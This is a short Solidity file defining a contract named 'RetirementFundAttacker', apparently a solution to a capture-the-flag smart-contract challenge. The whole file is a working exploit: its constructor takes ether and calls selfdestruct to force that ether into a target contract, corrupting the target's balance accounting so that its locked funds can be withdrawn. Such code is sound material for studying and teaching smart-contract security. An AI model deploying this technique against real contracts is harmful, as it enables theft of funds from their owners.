// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract RetirementFundAttacker{
    constructor(address _retirement) payable {
        require(msg.value >= 1 wei);
        _generateBalance(_retirement);
    }

    function _generateBalance(address _towards) internal {
        selfdestruct(payable(_towards));
    }
}